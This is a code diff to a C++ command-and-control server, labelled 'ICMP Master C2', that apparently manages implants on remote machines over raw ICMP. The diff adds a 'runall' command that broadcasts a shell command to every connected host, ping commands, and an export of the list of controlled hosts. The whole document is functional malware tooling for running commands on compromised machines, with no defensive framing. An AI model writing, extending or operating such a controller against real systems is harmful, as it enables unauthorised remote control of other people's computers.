@@ -8,6 +8,7 @@
 #include <map>
 #include <vector>
 #include <sstream>
+#include <fstream>
 
 #include <unistd.h>
 #include <sys/types.h>
@@ -215,14 +216,49 @@ void send_command(const std::string &dst, const std::string &command)
   }
 }
 
-int main(int argc, char **argv)
+void ping(const std::string &dst)
+{
+  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
+  if (sockfd == -1)
+  {
+    perror("socket");
+    exit(-1);
+  }
+  send_ping(sockfd, dst, NULL, 0);
+}
+
+void export_connections(const std::string &filename)
+{
+  std::ofstream file(filename);
+  if (file.is_open())
+  {
+    auto it = cur_connections.begin();
+    for (it; it != cur_connections.end(); it++)
+    {
+      file << it->first << ": " << it->second << "\n";
+    }
+    file.close();
+  }
+}
+
+void help()
 {
   std::puts("ICMP Master C2!");
   std::puts("Current commands:");
+  std::puts("\thelp: display this message");
   std::puts("\tstart: Begin listening for connections");
   std::puts("\tlist: List active connections");
+  std::puts("\tping [ip]");
+  std::puts("\tpingh [host]");
   std::puts("\trun [host] [command]: run a command on a target machine");
+  std::puts("\trunall [command]: runs command on all machines");
+  std::puts("\texport [filename]: exports currently connected hosts to file");
   std::puts("\texit: Exit program!");
+}
+
+int main(int argc, char **argv)
+{
+  help();
 
   while (1)
   {
@@ -232,7 +268,11 @@ int main(int argc, char **argv)
 
     auto input_arr = split_input(input);
 
-    if (input_arr.at(0).compare("start") == 0)
+    if (input_arr.at(0).compare("help") == 0)
+    {
+      help();
+    }
+    else if (input_arr.at(0).compare("start") == 0)
     {
       std::thread listen_thread(listen_task);
       listen_thread.detach();
@@ -247,6 +287,27 @@ int main(int argc, char **argv)
       {
         std::cout << it->first << ": " << it->second << "\n";
       }
+    }
+    else if (input_arr.at(0).compare("ping") == 0)
+    {
+      if (input_arr.size() < 2)
+      {
+        std::puts("usage: ping [ip]");
+        continue;
+      }
+      ping(input_arr.at(1));
+      std::cout << "Sending ping to: " << input_arr.at(1) << "\n";
+    }
+    else if (input_arr.at(0).compare("pingh") == 0)
+    {
+      if (input_arr.size() < 2)
+      {
+        std::puts("usage: pingh [host]");
+        continue;
+      }
+      std::string ip = cur_connections[input_arr.at(1)];
+      ping(ip);
+      std::cout << "Sending ping to: " << ip << "\n";
     }
     else if (input_arr.at(0).compare("run") == 0)
     {
@@ -271,6 +332,47 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       send_command(ip, command);
+    }
+    else if (input_arr.at(0).compare("runall") == 0)
+    {
+      if (input_arr.size() < 2)
+      {
+        std::puts("usage: runall [command]");
+        continue;
+      }
+
+      std::string command;
+      for (int i = 1; i < input_arr.size(); i++)
+      {
+        command.append(input_arr.at(i));
+        if (i != input_arr.size() - 1)
+        {
+          command.append(" ");
+        }
+      }
+
+      auto it = cur_connections.begin();
+      for (it; it != cur_connections.end(); it++)
+      {
+        std::cout << "Running command \"" << command << "\" on "
+                  << it->second
+                  << "\n";
+        send_command(it->second, command);
+      }
+    }
+    else if (input_arr.at(0).compare("export") == 0)
+    {
+      std::string filename;
+      if (input_arr.size() > 1)
+      {
+        filename = input_arr.at(1);
+      }
+      else
+      {
+        filename = "exported.txt";
+      }
+      std::cout << "Exporting to: " << filename << "\n";
+      export_connections(filename);
     }
     else if (input_arr.at(0).compare("exit") == 0)
     {
